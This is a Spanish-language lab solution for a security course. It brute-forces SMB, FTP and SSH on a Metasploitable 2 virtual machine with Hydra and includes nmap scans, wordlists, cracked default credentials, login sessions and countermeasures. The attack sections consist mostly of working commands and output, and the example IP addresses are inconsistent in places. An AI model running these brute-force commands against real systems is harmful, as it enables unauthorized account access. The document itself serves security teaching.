# Solución — Fuerza bruta sobre SMB, FTP y SSH (Metasploitable 2)

> Posible solución a la tarea [01_enunciado_fuerza_bruta_smb_ftp_ssh.md](./01_enunciado_fuerza_bruta_smb_ftp_ssh.md). Todas las pruebas se realizan sobre una máquina de laboratorio propia y aislada (Metasploitable 2), diseñada para practicar. Realizar estos mismos ataques contra sistemas de terceros sin autorización expresa y por escrito es ilegal.

## Índice

1. [Introducción y entorno de laboratorio](#1-introducción-y-entorno-de-laboratorio)
   - [Identificación de la máquina objetivo](#identificación-de-la-máquina-objetivo)
2. [Apartado 1 — Diccionarios de usuarios y contraseñas (SMB)](#2-apartado-1--diccionarios-de-usuarios-y-contraseñas-smb)
3. [Apartado 2 — Fuerza bruta sobre FTP (4 hilos)](#3-apartado-2--fuerza-bruta-sobre-ftp-4-hilos)
4. [Apartado 3 (opcional) — Fuerza bruta sobre SSH](#4-apartado-3-opcional--fuerza-bruta-sobre-ssh)
5. [Conclusiones](#5-conclusiones)

---

## 1. Introducción y entorno de laboratorio

El objetivo de esta práctica es realizar ataques de fuerza bruta (diccionario) contra varios servicios de red de una máquina vulnerable de laboratorio, partiendo de las recomendaciones de un informe de vulnerabilidades. Se trabaja íntegramente en un entorno aislado y controlado, destinado exclusivamente al aprendizaje de técnicas de auditoría de seguridad.

| Elemento | Descripción |
|---|---|
| **Máquina atacante** | Kali Linux, que incorpora las herramientas de pentesting utilizadas (Hydra, nmap, cliente FTP y SSH). |
| **Máquina objetivo** | Metasploitable 2, una distribución Debian deliberadamente vulnerable publicada con fines educativos. |
| **Red** | Ambas máquinas se encuentran en la misma red local aislada (red solo-anfitrión / interna de la máquina virtual). |

> **Aviso importante:** Todas las pruebas se realizan sobre una máquina de laboratorio propia y aislada (Metasploitable 2), diseñada para practicar. Realizar estos mismos ataques contra sistemas de terceros sin autorización expresa y por escrito es ilegal.

### Identificación de la máquina objetivo

En primer lugar se localiza la IP de la máquina objetivo dentro de la red local. Se realiza un barrido de hosts y, a continuación, un escaneo de servicios y versiones para confirmar qué puertos están abiertos (SMB, FTP y SSH).

```bash
# Descubrir los hosts activos de la red local
sudo nmap -sn 192.168.100.0/24

# Escanear servicios y versiones de la máquina objetivo
sudo nmap -sV 192.168.100.9
```

> **Nota:** en los comandos de este documento se usa como ejemplo la IP `192.168.100.100`. Debes sustituirla por la IP real de tu Metasploitable 2 (la que te devuelva nmap).

El escaneo confirma, entre otros, los servicios relevantes para la práctica:

- `21/tcp` — FTP (vsftpd 2.3.4)
- `22/tcp` — SSH (OpenSSH 4.7p1, versión muy antigua)
- `139/445 tcp` — SMB (Samba 3.x)

**Salida real del reconocimiento:**

```bash
┌──(root㉿kali)-[~]
└─# nmap -sn 192.168.100.0/24
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-25 15:59 +0100
Nmap scan report for 192.168.100.1
Host is up (0.00051s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 192.168.100.2
Host is up (0.00038s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 192.168.100.3
Host is up (0.00089s latency).
MAC Address: 08:00:27:AF:B1:B9 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.100.9
Host is up (0.00085s latency).
MAC Address: 08:00:27:F0:08:86 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.100.8
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 3.09 seconds
```

```bash
┌──(root㉿kali)-[~]
└─# nmap -sV 192.168.100.9
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-25 15:59 +0100
Nmap scan report for 192.168.100.9
Host is up (0.0020s latency).
Not shown: 976 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
53/tcp    open  domain      ISC BIND 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login       OpenBSD or Solaris rlogind
514/tcp   open  tcpwrapped
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp  open  vnc         VNC (protocol 3.3)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
54045/tcp open  nlockmgr    1-4 (RPC #100021)
MAC Address: 08:00:27:F0:08:86 (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.04 seconds
```

---

## 2. Apartado 1 — Diccionarios de usuarios y contraseñas (SMB)

Siguiendo las recomendaciones del informe de vulnerabilidades, se elaboran dos diccionarios para atacar el servicio SMB: uno con posibles nombres de usuario y otro con posibles contraseñas. Se parte de credenciales por defecto habituales en máquinas Debian y en los servicios típicos, que pueden consultarse en Internet.

### Criterio de elaboración

Las listas se mantienen pequeñas a propósito, para que el ataque no se demore. Se incluyen cuentas reales del sistema y de servicios de Metasploitable/Debian, además de contraseñas por defecto muy comunes. Tal y como indica el enunciado, se añade el usuario principal de la máquina con su contraseña (`msfadmin` / `msfadmin`) para comprobar que la herramienta es capaz de encontrar unas credenciales válidas.

### Fichero usuarios.txt

Se crea el fichero con un editor de texto (por ejemplo `nano`) o directamente desde la terminal:

```bash
nano usuarios.txt
# (se escribe un usuario por línea y se guarda)
```

Contenido del fichero `usuarios.txt`:

```
msfadmin
root
admin
administrator
user
service
guest
postgres
mysql
tomcat
ftp
sys
klog
daemon
bin
nobody
smbuser
samba
backup
operator
```

### Fichero dicionario.txt

De igual forma se crea el diccionario de contraseñas. Contenido del fichero `dicionario.txt`:

```
msfadmin
password
123456
12345
1234
admin
root
toor
user
service
guest
postgres
mysql
tomcat
letmein
qwerty
changeme
pass
password123
abc123
test
default
welcome
654321
```

> **Diccionarios en Kali:** Kali Linux incluye numerosos diccionarios en `/usr/share/wordlists/` (por ejemplo `rockyou.txt`, o listas más pequeñas dentro de los directorios de metasploit, nmap, etc.). Para esta práctica se usa un diccionario propio y pequeño para no demorar el ataque, pero el procedimiento sería idéntico apuntando a cualquiera de esos ficheros.

### Comprobación contra el servicio SMB

Para verificar que las listas son correctas y que efectivamente se localizan credenciales válidas, se lanza Hydra contra el servicio SMB de la máquina objetivo:

```bash
hydra -L usuarios.txt -P dicionario.txt 192.168.1.100 smb
```

| Parámetro | Descripción |
|---|---|
| `-L usuarios.txt` | Lista de usuarios a probar. |
| `-P dicionario.txt` | Lista de contraseñas a probar. |
| `smb` | Módulo del servicio objetivo. |

Entre las credenciales válidas, Hydra debe reportar al menos el usuario principal `msfadmin` con la contraseña `msfadmin`, confirmando que los diccionarios funcionan.

> **Si el módulo smb da problemas:** según la versión de Hydra, el módulo `smb` puede comportarse de forma distinta con Samba antiguo. Como alternativa puede usarse el módulo de Metasploit `auxiliary/scanner/smb/smb_login`, cargando `USER_FILE` y `PASS_FILE` con los mismos diccionarios y `RHOSTS` con la IP objetivo.

**Salida real del ataque:**

```bash
┌──(root㉿kali)-[~]
└─# hydra -L usuarios.txt -P dicionario.txt 192.168.100.9 smb
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military
 or secret service organizations, or for illegal purposes (this is non-binding, these
*** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-25 16:25:31
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 480 login tries (l:20/p:24), ~480 trie
s per task
[DATA] attacking smb://192.168.100.9:445/
[445][smb] host: 192.168.100.9   login: msfadmin   password: msfadmin
[445][smb] host: 192.168.100.9   login: user   password: user
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-25 16:25:40
```

---

## 3. Apartado 2 — Fuerza bruta sobre FTP (4 hilos)

En este apartado se realiza el ataque de fuerza bruta sobre el servicio FTP (puerto 21) utilizando los mismos diccionarios y limitando el ataque a 4 hilos en paralelo mediante la opción `-t 4`.

### Lanzamiento del ataque

```bash
hydra -L usuarios.txt -P dicionario.txt -t 4 ftp://192.168.1.100
```

Forma equivalente (indicando el servicio al final en lugar de con la sintaxis de URL):

```bash
hydra -L usuarios.txt -P dicionario.txt -t 4 192.168.1.100 ftp
```

| Parámetro | Descripción |
|---|---|
| `-t 4` | Número de intentos (hilos) en paralelo. Se limita a 4 según el enunciado, lo que además reduce el riesgo de saturar el servicio. |
| `ftp://` / `ftp` | Servicio FTP objetivo en el puerto 21. |

### Resultado esperado

Hydra irá probando cada combinación usuario/contraseña y mostrará en verde las credenciales válidas que encuentre. Una línea de resultado tiene el formato:

```
[21][ftp] host: 192.168.1.100   login: msfadmin   password: msfadmin
```

Dado el contenido de los diccionarios, es habitual que aparezcan varias cuentas válidas de Metasploitable (por ejemplo `msfadmin`, `user`, `service` o `postgres` con la contraseña igual al nombre de usuario).

**Salida real del ataque:**

```bash
┌──(root㉿kali)-[~]
└─# hydra -L usuarios.txt -P dicionario.txt -t 4 ftp://192.168.100.9
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military
 or secret service organizations, or for illegal purposes (this is non-binding, these
*** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-25 16:27:24
[DATA] max 4 tasks per 1 server, overall 4 tasks, 480 login tries (l:20/p:24), ~120 tr
ies per task
[DATA] attacking ftp://192.168.100.9:21/
[21][ftp] host: 192.168.100.9   login: msfadmin   password: msfadmin
[STATUS] 85.00 tries/min, 85 tries in 00:01h, 395 to do in 00:05h, 4 active
[21][ftp] host: 192.168.100.9   login: user   password: user
[21][ftp] host: 192.168.100.9   login: service   password: service
[21][ftp] host: 192.168.100.9   login: postgres   password: postgres
[21][ftp] host: 192.168.100.9   login: ftp   password: msfadmin
[21][ftp] host: 192.168.100.9   login: ftp   password: password
[21][ftp] host: 192.168.100.9   login: ftp   password: 123456
[STATUS] 94.33 tries/min, 283 tries in 00:03h, 197 to do in 00:03h, 4 active
1 of 1 target successfully completed, 7 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-25 16:33:30
```

> **Nota:** El primer intento de este ataque se lanzó por error contra una IP equivocada (`192.168.1.100`, de una plantilla genérica, en lugar de la `192.168.100.9` real del laboratorio), lo que provocó el error `[ERROR] all children were disabled due too many connection errors`. Es el mismo fallo que vimos al estudiar FTP: no es un problema de credenciales, sino de **conexión** — no hay nada escuchando en esa IP/puerto. Repetir el comando contra la IP correcta soluciona el problema.

### Comprobación del acceso FTP

Finalmente se verifica manualmente que las credenciales obtenidas permiten iniciar sesión en el servicio FTP:

```bash
ftp 192.168.100.9
# Name: msfadmin
# Password: msfadmin
# una vez dentro, por ejemplo:
ls
pwd
bye
```

**Salida real de la sesión FTP:**

```bash
┌──(root㉿kali)-[~]
└─# ftp 192.168.100.9
Connected to 192.168.100.9.
220 (vsFTPd 2.3.4)
Name (192.168.100.9:kali): msfadmin
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||33347|).
150 Here comes the directory listing.
drwxr-xr-x    6 1000     1000         4096 Apr 28  2010 vulnerable
226 Directory send OK.
ftp> pwd
Remote directory: /home/msfadmin
ftp> bye
221 Goodbye.
```

---

## 4. Apartado 3 (opcional) — Fuerza bruta sobre SSH

En este apartado opcional se ataca el servicio SSH (puerto 22) y se verifica el acceso. La particularidad es que el SSH de Metasploitable 2 emplea una versión muy antigua de OpenSSH que solo admite algoritmos criptográficos obsoletos, deshabilitados por defecto en las versiones modernas de Kali. Por ello es necesario ajustar la configuración para completar la conexión.

### Lanzamiento del ataque

```bash
hydra -L usuarios.txt -P dicionario.txt -t 4 ssh://192.168.100.9
```

> **Posibles errores de conexión:** por los algoritmos obsoletos del servidor, Hydra puede mostrar errores de conexión en SSH. La forma garantizada de comprobar las credenciales es la conexión manual con los algoritmos heredados habilitados, que se describe a continuación.

**Salida real del primer intento (falla por algoritmos obsoletos):**

```bash
┌──(root㉿kali)-[~]
└─# hydra -L usuarios.txt -P dicionario.txt -t 4 ssh://192.168.100.9
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military
 or secret service organizations, or for illegal purposes (this is non-binding, these
*** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-25 16:35:29
[DATA] max 4 tasks per 1 server, overall 4 tasks, 480 login tries (l:20/p:24), ~120 tr
ies per task
[DATA] attacking ssh://192.168.100.9:22/
[ERROR] could not connect to ssh://192.168.100.9:22 - kex error : no match for method
mac algo client->server: server [hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160
,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96], client [hmac-sha2-256-etm@opens
sh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512]
```

### Habilitar algoritmos obsoletos

Se edita el fichero de configuración del cliente SSH `/etc/ssh/ssh_config` y se añade un bloque para el host objetivo que vuelva a admitir los algoritmos antiguos:

```bash
sudo nano /etc/ssh/ssh_config
```

Bloque a añadir (sustituye `192.168.1.XXX` por la IP de tu máquina):

```
Host 192.168.100.9
    KexAlgorithms +diffie-hellman-group1-sha1
    HostKeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
    MACs +hmac-md5,hmac-sha1
```

### Comprobación del acceso SSH

Se comprueba el acceso por SSH desde Kali a la máquina Metasploitable 2 con las credenciales encontradas, indicando también los algoritmos heredados en la propia línea de comandos:

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.100.9
```

> **Sugerencia:** si además aparece un error de intercambio de claves (KEX), añade también la opción `-oKexAlgorithms=+diffie-hellman-group1-sha1` al comando anterior.

Tras aceptar la huella del host e introducir la contraseña (`msfadmin`), se obtiene una sesión en la máquina objetivo. Puede confirmarse con comandos como:

```bash
whoami
hostname
id
exit
```

**Salida real de la sesión SSH:**

```bash
┌──(root㉿kali)-[~]
└─# ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.
168.100.9
The authenticity of host '192.168.100.9 (192.168.100.9)' can't be established.
RSA key fingerprint is: SHA256:BQHm5EoHX9GCiOLuVscegPXLQOsuPs+E9d/rrJB84rk
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.9' (RSA) to the list of known hosts.
msfadmin@192.168.100.9's password:
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
No mail.
Last login: Sun May 20 15:50:42 2012 from 172.16.123.1
msfadmin@metasploitable:~$ whoami
msfadmin
msfadmin@metasploitable:~$ hostname
metasploitable
msfadmin@metasploitable:~$ id
uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),2
9(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashar
e),1000(msfadmin)
msfadmin@metasploitable:~$ exit
logout
Connection to 192.168.100.9 closed.
```

---

## 5. Conclusiones

La práctica muestra lo sencillo que resulta comprometer servicios que mantienen credenciales por defecto o contraseñas débiles. Con diccionarios pequeños y una herramienta estándar como Hydra se obtienen credenciales válidas en SMB y FTP en pocos segundos, y se accede por SSH pese a los algoritmos obsoletos del servidor.

### Contramedidas

- Eliminar todas las credenciales por defecto y exigir contraseñas robustas (longitud y complejidad) con caducidad.
- Limitar los intentos de autenticación y bloquear tras varios fallos (por ejemplo con *fail2ban*), lo que frena los ataques de fuerza bruta.
- Deshabilitar el acceso anónimo y los servicios no necesarios (FTP, Telnet, SMBv1…).
- Mantener el software actualizado: la versión de OpenSSH de Metasploitable es justamente insegura por antigua.
- Usar protocolos y algoritmos modernos y, cuando sea posible, autenticación por clave en lugar de por contraseña.
